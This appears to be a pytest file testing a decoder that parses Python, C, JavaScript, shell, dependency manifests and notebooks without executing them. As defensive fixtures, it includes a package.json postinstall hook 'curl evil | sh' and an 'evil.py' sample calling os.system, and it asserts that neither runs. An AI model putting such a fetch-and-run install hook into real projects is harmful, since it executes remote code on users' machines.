"""Lane B1 code: Python through ast (never run), a package in an archive, the surface reading of other
languages, dependency manifests, notebooks."""
import json

import pytest

from neuroscifi.artifacts import types as T
from neuroscifi.artifacts.adapters import code as codemod

import _b1_support
from _b1_support import make_zip

b1reg = _b1_support.b1reg      # the fixture

PY = b'''"""Module doc."""
import os
from collections import OrderedDict as OD

def helper(x):
    """Help."""
    return len(x)

class Base:
    pass

class Thing(Base):
    def run(self):
        self.step()
        return helper([1])

    def step(self):
        os.path.join("a", "b")
        OD()

if __name__ == "__main__":
    Thing().run()
'''


def edges(graph, kind):
    return {(e.src, e.dst) for e in graph.edges if e.kind == kind}


def test_python_graph(b1reg):
    out = b1reg.decode(PY, name="mod.py")
    assert out.detected.format == "python"
    g = out.representation
    ids = {n.id: n for n in g.nodes}
    assert ids["module:module"].attrs["doc"] == "Module doc."
    assert ids["function:module.helper"].attrs["line"] == 5 and ids["function:module.helper"].attrs["doc"] == "Help."
    assert ids["function:module.Thing.run"].attrs["method"] is True
    assert ("class:module.Thing", "function:module.Thing.run") in edges(g, "defines")
    calls = edges(g, "calls")
    assert ("function:module.Thing.run", "function:module.Thing.step") in calls
    assert ("function:module.Thing.run", "function:module.helper") in calls
    assert ("function:module.helper", "unresolved:len") in calls and ids["unresolved:len"].attrs["builtin"]
    assert ("function:module.Thing.step", "import:os.path.join") not in calls
    assert ("function:module.Thing.step", "unresolved:os.path.join") in calls
    assert ("module:module", "class:module.Thing") in calls             # the if __name__ block
    assert ("class:module.Thing", "class:module.Base") in edges(g, "inherits")
    assert ("module:module", "import:os") in edges(g, "imports")
    assert "network" in g.shape().kinds
    doc = codemod.outline(g)
    assert [b.text for b in doc.blocks if b.kind == "heading"][:3] == ["module module", "function helper", "class Base"]
    assert "hierarchy" in doc.shape().kinds


def test_python_is_never_executed(b1reg, tmp_path):
    marker = tmp_path / "ran"
    src = f"open({str(marker)!r}, 'w').write('x')\nimport os\nos.system('true')\n".encode()
    b1reg.decode(src, name="evil.py")
    assert not marker.exists()


def test_python_syntax_error_and_nesting_bomb(b1reg):
    with pytest.raises(T.Malformed):
        b1reg.decode(b"def f(:\n  pass\n", name="bad.py")
    with pytest.raises(T.Malformed):
        b1reg.decode(b"x = " + b"(" * 300 + b"1" + b")" * 300 + b"\n", name="deep.py")


def test_python_package_in_zip_resolves_across_files(b1reg):
    files = [("pkg/__init__.py", b"from .core import build\n"),
             ("pkg/core.py", b"from .util import clean\n\ndef build():\n    return clean()\n"),
             ("pkg/util.py", b"def clean():\n    return 1\n")]
    out = b1reg.decode(make_zip(files), name="src.zip")
    combined = next(m for m in out.representation.members if m.path == "(python package)")
    g = combined.inner
    assert ("function:pkg.core.build", "function:pkg.util.clean") in edges(g, "calls")
    assert ("module:pkg.core", "function:pkg.util.clean") in edges(g, "imports")


def test_surface_reading_of_c_js_shell(b1reg):
    c = b"#include <stdio.h>\n/* block\n comment */\n// line\nstruct point {\n int x;\n};\nint main(void)\n{\n  return 0;\n}\n"
    g = b1reg.decode(c, name="m.c").representation
    labels = {(n.kind, n.label) for n in g.nodes}
    assert ("function", "main") in labels and ("type", "point") in labels and ("import", "stdio.h") in labels
    module = next(n for n in g.nodes if n.kind == "module")
    assert module.attrs["comment_lines"] == 3 and module.attrs["lines"] == 11
    js = b"import x from './x.js';\nexport function go() {}\nconst f = (a) => a;\nclass K {}\n"
    labels = {(n.kind, n.label) for n in b1reg.decode(js, name="a.js").representation.nodes}
    assert {("function", "go"), ("function", "f"), ("class", "K"), ("import", "./x.js")} <= labels
    sh = b"#!/bin/sh\n# comment\nsetup() {\n  echo hi\n}\nfunction clean {\n :\n}\n. ./lib.sh\n"
    out = b1reg.decode(sh, name="run.sh")
    labels = {(n.kind, n.label) for n in out.representation.nodes}
    assert {("function", "setup"), ("function", "clean"), ("import", "./lib.sh")} <= labels
    assert any("surface reading" in n for n in out.notes)


def test_manifests(b1reg):
    py = (b'[project]\nname = "demo"\nversion = "1.0"\ndependencies = ["numpy>=2", "Zstandard==0.25; python_version>\'3\'"]\n'
          b'[project.optional-dependencies]\nweb = ["pypdf==7.1.1"]\n[build-system]\nrequires = ["setuptools>=69"]\n')
    g = b1reg.decode(py, name="pyproject.toml").representation
    kinds = {(e.dst, e.kind) for e in g.edges}
    assert {("package:numpy", "depends"), ("package:zstandard", "depends"), ("package:pypdf", "optional"),
            ("package:setuptools", "build")} <= kinds
    z = next(n for n in g.nodes if n.id == "package:zstandard")
    assert z.attrs["spec"] == "==0.25" and z.attrs["marker"] == "python_version>'3'"
    req = b"# pinned\nrequests==2.32\n-r other.txt\n--index-url https://x\nflask[async]>=3 ; os_name=='posix'\n"
    out = b1reg.decode(req, name="requirements.txt")
    assert {n.id for n in out.representation.nodes} >= {"package:requests", "package:flask"}
    assert any("not followed" in n for n in out.notes)
    pj = json.dumps({"name": "app", "dependencies": {"react": "^18"}, "devDependencies": {"vite": "5"},
                     "scripts": {"postinstall": "curl evil | sh"}}).encode()
    out = b1reg.decode(pj, name="package.json")
    assert {(e.dst, e.kind) for e in out.representation.edges} == {("package:react", "depends"),
                                                                  ("package:vite", "dev")}
    assert any("never run" in n for n in out.notes)


def test_notebook(b1reg):
    nb = {"nbformat": 4, "nbformat_minor": 5,
          "metadata": {"kernelspec": {"language": "python", "name": "python3"}},
          "cells": [{"cell_type": "markdown", "source": ["# Analysis\n", "Some words."], "metadata": {}},
                    {"cell_type": "code", "execution_count": 3, "source": "print(1)\n1+1", "metadata": {},
                     "outputs": [{"output_type": "stream", "name": "stdout", "text": ["1\n"]},
                                 {"output_type": "execute_result", "execution_count": 3,
                                  "data": {"text/plain": ["2"]}, "metadata": {}},
                                 {"output_type": "display_data", "data": {"image/png": "iVBORw0KGgo=",
                                                                           "text/plain": "<Figure>"}},
                                 {"output_type": "error", "ename": "ValueError", "evalue": "\x1b[31mbad\x1b[0m",
                                  "traceback": ["secret frame"]}]}]}
    out = b1reg.decode(json.dumps(nb).encode(), name="a.ipynb")
    assert out.detected.format == "ipynb"
    got = [(b.kind, b.text) for b in out.representation.blocks]
    assert got == [("heading", "Analysis"), ("paragraph", "Some words."), ("code", "print(1)\n1+1"), ("note", "1"),
                   ("note", "2"), ("figure", "<Figure>"), ("note", "ValueError: bad")]
    code = out.representation.blocks[2]
    assert code.ref == {"language": "python", "execution_count": 3, "cell": 2}
    assert out.representation.blocks[5].ref["member"] == "cell 2 output 3 (image/png)"
    assert "secret frame" not in out.representation.text()
    assert any("nothing was executed" in n for n in out.notes)
